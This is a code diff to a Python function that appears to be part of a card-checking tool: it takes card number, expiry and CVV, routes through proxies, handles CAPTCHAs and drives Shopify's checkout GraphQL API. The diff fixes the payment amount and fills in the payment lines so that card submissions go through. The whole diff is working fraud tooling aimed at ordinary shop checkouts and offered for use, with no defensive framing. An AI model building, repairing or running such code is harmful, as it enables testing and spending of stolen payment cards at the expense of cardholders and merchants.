@@ -1452,6 +1452,51 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 tax2_match = re.search(r'"totalAmountIncludedInTarget"\s*:\s*{[^}]*"value"\s*:\s*{[^}]*"amount"\s*:\s*"([\d.]+)"', resp_text)
             tax2 = float(tax2_match.group(1)) if tax2_match else 0.0
             
+            # CRITICAL FIX: Extract checkoutTotal/shipping from Proposal 1 for Proposal 2 payment amount
+            # Shopify requires payment amount = checkoutTotal (price + shipping + tax), NOT just price
+            _p1_checkout_total = None
+            _p1_shipping_cost = 0.0
+            try:
+                _p1_json = json.loads(resp_text)
+                _p1_seller = _p1_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
+                if _p1_seller:
+                    _p1_ct = _p1_seller.get('checkoutTotal', {}).get('value', {}).get('amount')
+                    if _p1_ct:
+                        _p1_checkout_total = float(_p1_ct)
+                        print(f'[PROPOSAL1] checkoutTotal={_p1_checkout_total} price={price} tax2={tax2}', file=sys.stderr)
+                    else:
+                        # Check for negotiate errors that might indicate wrong payment amount
+                        _p1_neg_errors = _p1_json.get('data', {}).get('session', {}).get('negotiate', {}).get('errors', [])
+                        if _p1_neg_errors:
+                            print(f'[PROPOSAL1] NEGOTIATE ERRORS: {json.dumps(_p1_neg_errors[:3])}', file=sys.stderr)
+                        else:
+                            print(f'[PROPOSAL1] No checkoutTotal, no errors. Keys: {list(_p1_seller.keys())[:15]}', file=sys.stderr)
+                    # Try to extract shipping cost from delivery lines
+                    _p1_del = _p1_seller.get('delivery', {})
+                    _p1_dls = _p1_del.get('deliveryLines', []) if _p1_del else []
+                    if _p1_dls:
+                        for _dl in _p1_dls:
+                            _strats = _dl.get('availableDeliveryStrategies', [])
+                            for _s in _strats:
+                                _breakdown = _s.get('deliveryStrategyBreakdown', [])
+                                for _bd in _breakdown:
+                                    _bd_amt = _bd.get('amount', {}).get('value', {}).get('amount', '0')
+                                    if _bd_amt and float(_bd_amt) > 0:
+                                        _p1_shipping_cost = float(_bd_amt)
+                                        break
+                    print(f'[PROPOSAL1] shipping_cost={_p1_shipping_cost}', file=sys.stderr)
+                else:
+                    print(f'[PROPOSAL1] No sellerProposal in response.', file=sys.stderr)
+            except (json.JSONDecodeError, KeyError, TypeError, ValueError) as _e:
+                print(f'[PROPOSAL1] Error parsing: {_e}', file=sys.stderr)
+            
+            # Calculate estimated total for payment (price + shipping estimate + tax)
+            if _p1_checkout_total and _p1_checkout_total > 0:
+                _estimated_total = _p1_checkout_total
+            else:
+                _estimated_total = price + _p1_shipping_cost + tax2
+            print(f'[PROPOSAL1] _estimated_total={_estimated_total} (price={price} + shipping={_p1_shipping_cost} + tax2={tax2})', file=sys.stderr)
+            
             # Fallback DMT from 1st proposal response
             if not DMT:
                 dmt_matches = re.findall(r'"deliveryMethodTypes"\s*:\s*\[(.*?)\]', resp_text)
@@ -1535,7 +1580,48 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'memberships': {'memberships': []},
                     'payment': {
                         'totalAmount': {'any': True},
-                        'paymentLines': [],
+                        'paymentLines': [{
+                            'paymentMethod': {
+                                'directPaymentMethod': {
+                                    'paymentMethodIdentifier': paymentMethodIdentifier,
+                                    'sessionId': sessionid,
+                                    'billingAddress': {
+                                        'streetAddress': {
+                                            'address1': street,
+                                            'city': city,
+                                            'countryCode': country_code,
+                                            'postalCode': s_zip,
+                                            'firstName': firstName,
+                                            'lastName': lastName,
+                                            'zoneCode': state,
+                                            'phone': phone,
+                                        },
+                                    },
+                                    'cardSource': None,
+                                },
+                                'giftCardPaymentMethod': None,
+                                'redeemablePaymentMethod': None,
+                                'walletPaymentMethod': None,
+                                'walletsPlatformPaymentMethod': None,
+                                'localPaymentMethod': None,
+                                'paymentOnDeliveryMethod': None,
+                                'paymentOnDeliveryMethod2': None,
+                                'manualPaymentMethod': None,
+                                'customPaymentMethod': None,
+                                'offsitePaymentMethod': None,
+                                'customOnsitePaymentMethod': None,
+                                'deferredPaymentMethod': None,
+                                'customerCreditCardPaymentMethod': None,
+                                'paypalBillingAgreementPaymentMethod': None,
+                                'remotePaymentInstrument': None,
+                            },
+                            'amount': {
+                                'value': {
+                                    'amount': f'{_estimated_total}',
+                                    'currencyCode': currency,
+                                },
+                            },
+                        }],
                         'billingAddress': {
                             'streetAddress': {
                                 'address1': street,
@@ -1600,6 +1686,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             proposal2_data['variables']['sessionInput']['sessionToken'] = x_checkout_one_session_token
             
             # Retry 2nd proposal up to 3 times if signedHandle not found
+            print(f'[PROPOSAL2_PREP] price={price} sessionid={sessionid} paymentMethodIdentifier={paymentMethodIdentifier} tax2={tax2} DMT={DMT}', file=sys.stderr)
             for _proposal2_attempt in range(3):
                 response2, resp_text2, _graphql_ok2 = await make_graphql_request_with_captcha_handling(
                     session, graphql_url, proposal2_params, checkout_web_headers, proposal2_data,
@@ -1611,6 +1698,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             
             if not response2 or not _graphql_ok2:
                 return False, f"Proposal 2 request failed: {resp_text2[:200]}", gateway, total_price, currency
+            
+            # LOG: Save full proposal 2 response for debugging
+            with open('/tmp/proposal2_response.json', 'w') as _dbg_f:
+                _dbg_f.write(resp_text2)
+            print(f'[PROPOSAL2_RAW] Saved full response to /tmp/proposal2_response.json ({len(resp_text2)} chars)', file=sys.stderr)
             
             if is_captcha_required(resp_text2):
                 return False, "CAPTCHA_REQUIRED on proposal 2", gateway, total_price, currency
